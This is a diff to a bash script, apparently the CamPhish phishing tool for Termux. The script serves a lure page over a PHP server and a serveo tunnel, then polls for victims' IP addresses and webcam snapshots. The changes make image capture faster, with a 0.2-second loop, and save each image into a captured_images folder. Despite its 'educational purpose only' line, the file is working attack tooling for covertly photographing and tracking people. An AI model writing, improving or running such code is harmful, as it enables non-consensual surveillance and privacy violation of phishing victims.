@@ -1,5 +1,5 @@
 #!/bin/bash
-# CamPhish v2.0 - Termux edition (fixed for fuser issue)
+# CamPhish v2.1 - Termux optimized + fast image capture
 # Educational purpose only
 
 trap 'printf "\n"; stop' 2
@@ -14,7 +14,7 @@ banner() {
     echo -e "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m"
     echo -e "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m"
     echo -e "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m"
-    echo -e "\n\e[1;77m              Termux Edition - Educational Purpose\e[0m\n"
+    echo -e "\n\e[1;77m         Fast Capture Edition - Monitor every 0.3 sec\e[0m\n"
 }
 
 stop() {
@@ -65,18 +65,15 @@ serveo_tunnel() {
 
 start_php_server() {
     echo -e "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting PHP server on port 3333...\e[0m"
-    # Termux fix: kill any process using port 3333
+    # Termux fix: kill process using port 3333
     pid=$(lsof -ti:3333 2>/dev/null)
-    if [ -n "$pid" ]; then
-        kill -9 $pid 2>/dev/null
-    fi
-    # Alternative: use pkill
+    [ -n "$pid" ] && kill -9 $pid 2>/dev/null
     pkill -f "php -S localhost:3333" 2>/dev/null
     php -S localhost:3333 > /dev/null 2>&1 &
     PHP_PID=$!
     sleep 2
     if ! kill -0 $PHP_PID 2>/dev/null; then
-        echo -e "\e[1;91m[!] PHP server failed. Check if PHP is installed.\e[0m"
+        echo -e "\e[1;91m[!] PHP server failed. Check PHP installation.\e[0m"
         exit 1
     fi
     echo -e "\e[1;92m[+] PHP server running on port 3333\e[0m"
@@ -97,20 +94,32 @@ build_payload() {
 }
 
 monitor_captures() {
-    echo -e "\e[1;93m[*] Monitoring for captures. Press Ctrl+C to stop.\e[0m\n"
+    mkdir -p captured_images
+    echo -e "\e[1;93m[*] Monitoring fast captures (every 0.2s). Press Ctrl+C to stop.\e[0m\n"
     while true; do
+        # Capture IPs
         if [ -f "ip.txt" ]; then
             IP=$(grep -a 'IP:' ip.txt | cut -d ' ' -f2 | tr -d '\r')
             echo -e "\e[1;92m[+] New IP captured:\e[0m \e[1;77m$IP\e[0m"
             cat ip.txt >> saved_ips.txt
             rm -f ip.txt
         fi
+        # Capture images from cam*.png (saved by post.php)
+        for img in cam*.png; do
+            if [ -f "$img" ]; then
+                newname="captured_images/$(date +"%Y%m%d_%H%M%S_%N")_$img"
+                mv "$img" "$newname"
+                echo -e "\e[1;92m[+] Fast image saved:\e[0m $newname"
+            fi
+            break
+        done
+        # Fallback: Log.log
         if [ -f "Log.log" ]; then
             TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
-            mv Log.log "capture_$TIMESTAMP.log"
-            echo -e "\e[1;92m[+] Image captured! Saved as capture_$TIMESTAMP.log\e[0m"
+            mv Log.log "captured_images/capture_$TIMESTAMP.log"
+            echo -e "\e[1;92m[+] Log image saved: captured_images/capture_$TIMESTAMP.log\e[0m"
         fi
-        sleep 1
+        sleep 0.2
     done
 }
 
@@ -138,7 +147,7 @@ select_template() {
 main() {
     banner
     select_template
-    rm -f capture_*.log saved_ips.txt ip.txt Log.log current_link.txt sendlink
+    rm -rf captured_images capture_*.log saved_ips.txt ip.txt Log.log current_link.txt sendlink cam*.png
     start_php_server
     serveo_tunnel
     LINK=$(cat current_link.txt)
